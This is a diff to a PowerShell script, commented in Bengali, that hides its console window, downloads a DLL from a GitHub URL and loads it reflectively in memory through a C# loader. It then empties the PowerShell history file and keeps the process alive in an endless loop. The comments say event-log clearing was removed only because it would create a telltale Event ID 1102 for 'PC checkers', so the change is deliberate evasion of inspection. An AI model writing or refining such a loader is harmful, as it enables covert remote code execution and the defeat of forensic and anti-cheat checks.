@@ -21,7 +21,22 @@ if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsId
     exit
 }
 
-# C# Loader (আপনার দেওয়া)
+# ============================================================
+#  ★★★ ১. কনসোল উইন্ডো হাইড করুন ★★★
+# ============================================================
+Add-Type -Name Window -Namespace Console -MemberDefinition @'
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'@
+
+$consoleHandle = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consoleHandle, 0)   # 0 = SW_HIDE
+
+# ============================================================
+#  ★★★ ২. C# লোডার ★★★
+# ============================================================
 $kernel = @'
 using System;
 using System.Runtime.InteropServices;
@@ -188,18 +203,36 @@ try {
     $type = [NativeLoader]
 }
 
-# DLL ডাউনলোড ও লোড
+# ============================================================
+#  ★★★ ৩. DLL ডাউনলোড ও লোড ★★★
+# ============================================================
 $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll");
 [NativeLoader]::Map($bytes, $true)
 
-# ─── ট্রেস ক্লিয়ার (পাওয়ারশেল) ──────────────────────────────
+# ============================================================
+#  ★★★ ৪. ট্রেস ক্লিয়ার (সাইলেন্ট) ★★★
+# ============================================================
+
+# --- 4A: Clear PowerShell History (Empty the file, DO NOT DELETE it) ---
 Clear-History
 $historyPath = (Get-PSReadlineOption).HistorySavePath
-if (Test-Path $historyPath) { Remove-Item $historyPath -Force }
+if (Test-Path $historyPath) {
+    # ফাইলটি খালি করে দিন (0 বাইটে), কিন্তু ডিলিট করবেন না
+    Clear-Content -Path $historyPath -Force
+}
 
-wevtutil cl "Windows PowerShell" 2>$null
-wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+# --- 4B: Event Log Clearing (COMPLETELY REMOVED) ---
+# আমরা wevtutil cl ব্যবহার করছি না, কারণ ইভেন্ট লগ ক্লিয়ার করলে Event ID 1102 তৈরি হয়,
+# যা PC চেকারের জন্য একটি বিশাল রেড ফ্ল্যাগ। তাই আমরা একে বাদ দিচ্ছি।
 
+# মেমরি ক্লিনআপ
 $bytes = $null
 [GC]::Collect()
 [GC]::WaitForPendingFinalizers()
+
+# ============================================================
+#  ★★★ ৫. অসীম লুপ (পাওয়ারশেল প্রক্রিয়া চালু রাখতে) ★★★
+# ============================================================
+while ($true) {
+    Start-Sleep -Seconds 86400   # ২৪ ঘণ্টা
+}
